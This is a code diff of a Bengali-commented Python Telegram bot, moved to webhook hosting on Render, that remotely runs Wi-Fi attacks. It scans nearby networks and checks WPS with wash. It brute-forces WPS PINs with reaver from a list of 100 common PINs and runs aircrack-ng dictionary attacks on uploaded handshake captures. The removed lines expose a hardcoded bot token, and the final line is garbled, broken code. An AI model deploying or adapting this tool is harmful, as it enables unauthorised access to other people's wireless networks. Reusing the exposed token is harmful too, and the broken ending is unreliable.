@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-WPSApp টেলিগ্রাম বট – শুধুমাত্র নিজের নেটওয়ার্ক টেস্টের জন্য।
-দায়িত্ব নিয়ে ব্যবহার করুন।
+WPSApp টেলিগ্রাম বট – রেন্ডারের জন্য ওয়েবহুক মোড
+শুধুমাত্র নিজের নেটওয়ার্ক টেস্টের জন্য। দায়িত্ব নিয়ে ব্যবহার করুন।
 """
 
 import os
@@ -12,12 +12,21 @@ import tempfile
 import logging
 from typing import Dict, List, Optional
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackContext
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ========== কনফিগারেশন ==========
-BOT_TOKEN = os.environ.get("8919343304:AAHX0sGQHIP3obd_pcNZC0tNigMSxLLbT1Q", "8919343304:AAHX0sGQHIP3obd_pcNZC0tNigMSxLLbT1Q")  # এনভায়রনমেন্ট ভেরিয়েবল বা সরাসরি দিন
-INTERFACE = "wlan0"  # আপনার ওয়্যারলেস ইন্টারফেস
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN environment variable not set")
+
+PORT = int(os.environ.get("PORT", 10000))
+RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL")  # রেন্ডার স্বয়ংক্রিয়ভাবে সেট করে
+if not RENDER_URL:
+    # লোকাল টেস্টিংয়ের জন্য
+    RENDER_URL = "https://your-app-url.onrender.com"
+
+INTERFACE = os.environ.get("WLAN_INTERFACE", "wlan0")
 
 # ========== ১০০টি কমন WPS PIN ==========
 WPS_PINS = [
@@ -78,9 +87,7 @@ logger = logging.getLogger(__name__)
 
 # ========== হেল্পার ফাংশন (async) ==========
 async def run_command(cmd: str, timeout: int = 30) -> str:
-    """
-    শেল কমান্ড রান করে আউটপুট রিটার্ন করে। (async)
-    """
+    """শেল কমান্ড রান করে আউটপুট রিটার্ন করে।"""
     try:
         proc = await asyncio.create_subprocess_shell(
             cmd,
@@ -97,39 +104,35 @@ async def run_command(cmd: str, timeout: int = 30) -> str:
 
 # ========== বটের কমান্ড হ্যান্ডলার ==========
 
-# 1. /start
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 **WPSApp বটে স্বাগতম!**\n\n"
         "আমি আপনার Wi-Fi নেটওয়ার্কের নিরাপত্তা টেস্ট করতে সাহায্য করি।\n"
-        "⚠️ **শুধুমাত্র আপনার নিজের নেটওয়ার্কে ব্যবহার করুন। অন্যের নেটওয়ার্কে অনুপ্রবেশ আইনত দণ্ডনীয়।**\n\n"
+        "⚠️ **শুধুমাত্র আপনার নিজের নেটওয়ার্কে ব্যবহার করুন।**\n\n"
         "📌 **উপলব্ধ কমান্ড:**\n"
         "/scan – আশেপাশের নেটওয়ার্ক স্ক্যান করুন\n"
-        "/select <নম্বর> – স্ক্যান লিস্ট থেকে টার্গেট সিলেক্ট করুন\n"
-        "/wpscheck – সিলেক্টেড নেটওয়ার্কের WPS স্ট্যাটাস চেক করুন\n"
-        "/wpspin – ১০০টি কমন WPS পিন ট্রাই করুন\n"
-        "/dicattack – .cap ফাইল আপলোড করে ডিকশনারি অ্যাটাক চালান\n"
-        "/help – এই মেসেজ দেখান"
+        "/select <নম্বর> – টার্গেট সিলেক্ট করুন\n"
+        "/wpscheck – WPS স্ট্যাটাস চেক\n"
+        "/wpspin – ১০০টি কমন পিন ট্রাই করুন\n"
+        "/dicattack – .cap ফাইল আপলোড করে ডিকশনারি অ্যাটাক\n"
+        "/help – এই মেসেজ"
     )
 
-# 2. /help
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await start(update, context)
 
-# 3. /scan
 async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = await update.message.reply_text("📡 স্ক্যান শুরু হচ্ছে... (৩০ সেকেন্ড সময় লাগতে পারে)")
+    msg = await update.message.reply_text("📡 স্ক্যান শুরু হচ্ছে... (৩০ সেকেন্ড)")
     cmd = f"sudo iwlist {INTERFACE} scan"
     output = await run_command(cmd, timeout=45)
 
     if "TIMEOUT" in output:
-        await msg.edit_text("⏰ স্ক্যান টাইমআউট হয়েছে। ইন্টারফেস চেক করুন।")
+        await msg.edit_text("⏰ টাইমআউট। ইন্টারফেস চেক করুন।")
         return
     if "ERROR" in output:
         await msg.edit_text(f"❌ ত্রুটি: {output}")
         return
 
-    # পার্সিং
     networks = []
     current = {}
     for line in output.split('\n'):
@@ -153,23 +156,18 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text("❌ কোনো নেটওয়ার্ক পাওয়া যায়নি।")
         return
 
-    # ইউজারের ডেটায় সংরক্ষণ
     context.user_data['networks'] = networks
-
-    reply = "📋 **পাওয়া নেটওয়ার্কসমূহ:**\n\n"
+    reply = "📋 **পাওয়া নেটওয়ার্ক:**\n\n"
     for i, net in enumerate(networks):
         reply += f"{i+1}. {net.get('essid', 'Unknown')} ({net.get('bssid', 'N/A')}) - Ch {net.get('channel', '?')}\n"
-
     reply += f"\nমোট {len(networks)}টি। সিলেক্ট করতে `/select <নম্বর>` দিন।"
     await msg.edit_text(reply, parse_mode='Markdown')
 
-# 4. /select
 async def select(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
-        await update.message.reply_text("❗ ব্যবহার: `/select <নম্বর>` (যেমন `/select 1`)")
+        await update.message.reply_text("❗ ব্যবহার: `/select <নম্বর>`")
         return
-
     try:
         idx = int(args[0]) - 1
         networks = context.user_data.get('networks', [])
@@ -179,113 +177,79 @@ async def select(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if idx < 0 or idx >= len(networks):
             await update.message.reply_text("❌ ভুল নম্বর।")
             return
-
         target = networks[idx]
         context.user_data['target_bssid'] = target.get('bssid')
         context.user_data['target_essid'] = target.get('essid')
         await update.message.reply_text(
-            f"✅ টার্গেট সিলেক্ট করা হয়েছে:\n"
-            f"📶 {target.get('essid', 'Unknown')}\n"
-            f"🆔 {target.get('bssid')}\n"
-            f"📡 চ্যানেল: {target.get('channel', '?')}\n\n"
-            f"এখন `/wpscheck` বা `/wpspin` চালান।"
+            f"✅ টার্গেট সিলেক্ট: {target.get('essid')} ({target.get('bssid')})"
+            f"\nএখন `/wpscheck` বা `/wpspin` চালান।"
         )
     except (ValueError, IndexError):
         await update.message.reply_text("❌ সঠিক নম্বর দিন।")
 
-# 5. /wpscheck
 async def wpscheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bssid = context.user_data.get('target_bssid')
     if not bssid:
-        await update.message.reply_text("❓ আগে `/select` দিয়ে টার্গেট বেছে নিন।")
+        await update.message.reply_text("❓ আগে `/select` দিন।")
         return
-
-    msg = await update.message.reply_text(f"🔍 {bssid} এর WPS স্ট্যাটাস চেক করা হচ্ছে...")
+    msg = await update.message.reply_text(f"🔍 {bssid} এর WPS স্ট্যাটাস চেক...")
     cmd = f"sudo wash -i {INTERFACE} -b {bssid} -c 1"
     output = await run_command(cmd, timeout=20)
 
     if "TIMEOUT" in output or not output.strip():
-        await msg.edit_text("❌ WPS তথ্য পাওয়া যায়নি (WPS বন্ধ থাকতে পারে)।")
+        await msg.edit_text("❌ WPS বন্ধ থাকতে পারে।")
         return
 
-    # পার্সিং
-    lines = output.split('\n')
     found = False
-    for line in lines:
+    for line in output.split('\n'):
         if bssid.lower() in line.lower():
             parts = line.split()
             if len(parts) >= 6:
-                info = (
-                    f"📡 **WPS তথ্য:**\n"
-                    f"BSSID: {parts[0]}\n"
-                    f"চ্যানেল: {parts[1]}\n"
-                    f"RSSI: {parts[2]}\n"
-                    f"WPS ভার্সন: {parts[3]}\n"
-                    f"লকড: {parts[4]}\n"
-                    f"ম্যানুফ্যাকচারার: {' '.join(parts[5:])}"
-                )
+                info = f"📡 **WPS তথ্য:**\nBSSID: {parts[0]}\nচ্যানেল: {parts[1]}\nRSSI: {parts[2]}\nWPS ভার্সন: {parts[3]}\nলকড: {parts[4]}\nম্যানুফ্যাকচারার: {' '.join(parts[5:])}"
                 if parts[4].lower() == "no" and parts[3].startswith("1."):
-                    info += "\n\n⚠️ **সম্ভাব্য ভলনারেবল!** (WPS লক নেই)"
+                    info += "\n\n⚠️ **সম্ভাব্য ভলনারেবল!**"
                 else:
-                    info += "\n\n🛡️ WPS নিরাপদ বা লককৃত।"
+                    info += "\n\n🛡️ নিরাপদ বা লককৃত।"
                 await msg.edit_text(info, parse_mode='Markdown')
                 found = True
                 break
-
     if not found:
-        await msg.edit_text("❌ WPS তথ্য পার্স করা যায়নি।")
+        await msg.edit_text("❌ WPS তথ্য পাওয়া যায়নি।")
 
-# 6. /wpspin (১০০টি পিন ট্রাই)
 async def wpspin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bssid = context.user_data.get('target_bssid')
     if not bssid:
-        await update.message.reply_text("❓ আগে `/select` দিয়ে টার্গেট বেছে নিন।")
+        await update.message.reply_text("❓ আগে `/select` দিন।")
         return
-
-    msg = await update.message.reply_text(f"🔑 {len(WPS_PINS)}টি কমন পিন ট্রাই শুরু হচ্ছে... (ধৈর্য্য রাখুন)")
-
+    msg = await update.message.reply_text(f"🔑 {len(WPS_PINS)}টি পিন ট্রাই শুরু...")
     found_pin = None
     for i, pin in enumerate(WPS_PINS):
-        try:
-            # প্রতি ১০টি পিনে আপডেট দেই
-            if i % 10 == 0:
-                await msg.edit_text(f"⏳ ট্রাই {i+1}/{len(WPS_PINS)}... (বর্তমান পিন: {pin})")
-
-            cmd = f"sudo reaver -i {INTERFACE} -b {bssid} -p {pin} -t 1 -d 0 -c 1"
-            output = await run_command(cmd, timeout=15)
-
-            if "WPS PIN" in output and "success" in output.lower():
-                found_pin = pin
-                break
-            if "PIN found" in output:
-                found_pin = pin
-                break
-            # যদি "Locked" বা "Fail" আসে, তবুও চালিয়ে যাই
-        except Exception as e:
-            logger.error(f"Reaver error for pin {pin}: {e}")
-            continue
-
+        if i % 10 == 0:
+            await msg.edit_text(f"⏳ ট্রাই {i+1}/{len(WPS_PINS)}... (পিন: {pin})")
+        cmd = f"sudo reaver -i {INTERFACE} -b {bssid} -p {pin} -t 1 -d 0 -c 1"
+        output = await run_command(cmd, timeout=15)
+        if "WPS PIN" in output and "success" in output.lower():
+            found_pin = pin
+            break
+        if "PIN found" in output:
+            found_pin = pin
+            break
     if found_pin:
-        await msg.edit_text(f"✅ **সফল!** WPS পিন পাওয়া গেছে: `{found_pin}`\n"
-                            f"এখন এই পিন দিয়ে ম্যানুয়ালি কানেক্ট করুন।")
+        await msg.edit_text(f"✅ **সফল!** পিন: `{found_pin}`")
     else:
-        await msg.edit_text("❌ **ব্যর্থ!** ১০০টি কমন পিনের কোনোটিই কাজ করেনি।")
+        await msg.edit_text("❌ সব পিন ব্যর্থ।")
 
-# 7. /dicattack (ডিকশনারি অ্যাটাক)
 async def dicattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cap_path = context.user_data.get('cap_file_path')
     bssid = context.user_data.get('target_bssid')
-
     if not bssid:
-        await update.message.reply_text("❓ আগে `/select` দিয়ে টার্গেট বেছে নিন।")
+        await update.message.reply_text("❓ আগে `/select` দিন।")
         return
     if not cap_path or not os.path.exists(cap_path):
-        await update.message.reply_text("❓ প্রথমে একটি `.cap` ফাইল আপলোড করুন।")
+        await update.message.reply_text("❓ প্রথমে `.cap` ফাইল আপলোড করুন।")
         return
 
-    msg = await update.message.reply_text(f"🔓 {len(WPA_PASSWORDS)}টি পাসওয়ার্ড ডিকশনারি অ্যাটাক শুরু...")
-
-    # টেম্প ওয়ার্ডলিস্ট তৈরি
+    msg = await update.message.reply_text(f"🔓 {len(WPA_PASSWORDS)}টি পাসওয়ার্ড ট্রাই...")
     with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
         wordlist_path = f.name
         for pwd in WPA_PASSWORDS:
@@ -293,8 +257,6 @@ async def dicattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     cmd = f"sudo aircrack-ng -w {wordlist_path} -b {bssid} {cap_path}"
     output = await run_command(cmd, timeout=120)
-
-    # টেম্প ফাইল ডিলিট
     try:
         os.unlink(wordlist_path)
     except:
@@ -303,50 +265,26 @@ async def dicattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if "KEY FOUND" in output:
         match = re.search(r"KEY FOUND! \[ (.*?) \]", output)
         if match:
-            password = match.group(1)
-            await msg.edit_text(f"✅ **পাসওয়ার্ড পাওয়া গেছে!**\n🔑 `{password}`")
+            await msg.edit_text(f"✅ **পাসওয়ার্ড:** `{match.group(1)}`")
             return
-        else:
-            await msg.edit_text("✅ কী ফাউন্ড, কিন্তু পাসওয়ার্ড এক্সট্র্যাক্ট করা যায়নি।")
-            return
-    else:
-        await msg.edit_text("❌ ডিকশনারি অ্যাটাকে কোনো পাসওয়ার্ড মেলেনি।")
+    await msg.edit_text("❌ কোনো পাসওয়ার্ড মেলেনি।")
 
-# 8. ফাইল আপলোড হ্যান্ডলার (.cap ফাইলের জন্য)
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    document = update.message.document
-    if not document:
-        return
-
-    file_name = document.file_name
-    if not file_name.endswith('.cap'):
+    doc = update.message.document
+    if not doc or not doc.file_name.endswith('.cap'):
         await update.message.reply_text("❌ শুধু `.cap` ফাইল আপলোড করুন।")
         return
-
-    # টেম্প ফাইল সেভ
     with tempfile.NamedTemporaryFile(delete=False, suffix='.cap') as tmp:
         tmp_path = tmp.name
-
-    file = await document.get_file()
+    file = await doc.get_file()
     await file.download_to_drive(tmp_path)
-
     context.user_data['cap_file_path'] = tmp_path
-    await update.message.reply_text(
-        f"✅ `.cap` ফাইল সেভ করা হয়েছে: `{os.path.basename(tmp_path)}`\n"
-        f"এখন `/dicattack` চালান।",
-        parse_mode='Markdown'
-    )
+    await update.message.reply_text(f"✅ `.cap` ফাইল সেভ করা হয়েছে। এখন `/dicattack` চালান।")
 
-# ========== মেইন ফাংশন ==========
+# ========== মেইন ফাংশন (ওয়েবহুক) ==========
 def main():
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ দয়া করে BOT_TOKEN সেট করুন (export BOT_TOKEN='your_token')")
-        return
-
-    # অ্যাপ্লিকেশন বিল্ড
     application = Application.builder().token(BOT_TOKEN).build()
 
-    # হ্যান্ডলার যোগ
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_cmd))
     application.add_handler(CommandHandler("scan", scan))
@@ -356,9 +294,20 @@ def main():
     application.add_handler(CommandHandler("dicattack", dicattack))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
-    # বট চালু
-    print("✅ বট চালু হচ্ছে...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # রেন্ডার পরিবেশ চিনে ওয়েবহুক সেট করি
+    if os.environ.get("RENDER"):
+        webhook_url = f"{RENDER_URL}/webhook"
+        logger.info(f"Setting webhook: {webhook_url}")
+        application.run_webhook(
+            listen="0.0.0.0",
+            port=PORT,
+            url_path="webhook",
+            webhook_url=webhook_url
+        )
+    else:
+        # লোকাল টেস্টিং – পোলিং
+        application.run_polling()
 
 if __name__ == "__main__":
-    main()
+    main()for (CommandHandler("start", start))
+    
